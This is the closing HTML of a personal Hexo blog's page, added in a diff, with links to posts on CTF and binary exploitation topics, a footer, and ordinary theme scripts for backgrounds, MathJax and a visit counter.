+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/堆上的off-by-null/">堆上的off-by-null</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/装IDA-Key-Patch/">windows IDA key-patch</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/最近的事/">最近的事情</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/荒废已久的pwn复习总结/">荒废已久的pwn复习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/ret2dl-runtime-resolve/">ret2dl_runtime_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/OSX装angr/">OSX装angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/19/DDCTF-2019-WriteUp/">DDCTF 2019 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/堆利用——布局内存任意地址写/">堆利用——布局内存任意地址写</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/转载-IDA代码类型转换/">转载:IDA代码类型转换</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/VMware-Fusion-NAT无法连接网络/">VMware Fusion NAT无法连接网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/堆利用/">堆利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/padding-oracle-attack/">padding oracle attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/格式化字符串/">格式化字符串</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/openssl相关知识/">openssl相关知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/xargs命令/">xargs命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/一个有趣的包——tqdm/">一个有趣的包——tqdm</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/python-gpg模块使用/">Python-gnupg Usage</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/ctf中常用模块之binascii/">ctf中常用模块之binascii</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/underfitting-overfitting/">underfitting & overfitting</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/现代密码学——对称加密和非对称加密/">密码学小整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/20/编译glibc遇到的问题/">编译glibc遇到的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/二进制的一些基本操作/">准备pwn环境的一些基本操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/64位ROP练习/">64位ROP练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/zip的选择明文攻击/">zip的选择明文攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/docker基本命令/">docker基本命令</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2019 hustcw
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#414141", "#e5a859", "#f5dfc6", "#847e72", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
